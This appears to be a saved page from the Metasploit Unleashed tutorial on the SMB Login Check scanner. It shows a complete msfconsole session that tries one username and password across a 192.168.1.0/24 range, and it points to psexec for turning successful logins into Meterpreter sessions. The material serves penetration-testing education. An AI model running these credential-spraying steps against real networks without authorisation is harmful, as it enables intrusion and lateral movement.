<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>SMB Login Check</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">SMB
Login Check</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">A common situation to find yourself in
is being in possession of a
valid username and password combination, and wondering where else you
can use it. This is where the SMB Login Check Scanner can be very
useful, as it will connect to a range of hosts and determine if the
username/password combination can access the target.
</p>
<p style="color: rgb(0, 0, 0);">Keep in mind, this is very "loud" as it
will show up as a
failed login attempt in the event logs of every Windows box it touches.
Be thoughtful on the network you are taking this action on. Any
successful results can be plugged into the windows/smb/psexec exploit
module (exactly like the standalone tool) which can be utilized to
create Meterpreter sessions.
<br>
<br>
</p>
<pre id="code">msf &gt; use auxiliary/scanner/smb/login<br>msf auxiliary(login) &gt; show options<br><br>Module options:<br><br>   Name       Current Setting  Required  Description<br>   ----       ---------------  --------  -----------<br>   RHOSTS                      yes       The target address range or CIDR identifier<br>   RPORT      445              yes       Set the SMB service port<br>   SMBDomain  WORKGROUP        no        SMB Domain<br>   SMBPass                     no        SMB Password<br>   SMBUser    Administrator    no        SMB Username<br>   THREADS    1                yes       The number of concurrent threads<br><br>msf auxiliary(login) &gt; set RHOSTS 192.168.1.0/24<br>RHOSTS =&gt; 192.168.1.0/24<br>msf auxiliary(login) &gt; set SMBUser victim<br>SMBUser =&gt; victim<br>msf auxiliary(login) &gt; set SMBPass s3cr3t<br>SMBPass =&gt; s3cr3t<br>msf auxiliary(login) &gt; set THREADS 50<br>THREADS =&gt; 50<br>msf auxiliary(login) &gt; run<br><br>[*] 192.168.1.100 - FAILED 0xc000006d - STATUS_LOGON_FAILURE<br>[*] 192.168.1.111 - FAILED 0xc000006d - STATUS_LOGON_FAILURE<br>[*] 192.168.1.114 - FAILED 0xc000006d - STATUS_LOGON_FAILURE<br>[*] 192.168.1.125 - FAILED 0xc000006d - STATUS_LOGON_FAILURE<br>[*] 192.168.1.116 - SUCCESSFUL LOGIN (Unix)<br>[*] Auxiliary module execution completed<br>msf auxiliary(login) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Vulnerability_Scanning"
 title="Vulnerability Scanning">Vulnerability Scanning</a></div>
<br style="color: rgb(0, 0, 0);">
</body>
</html>
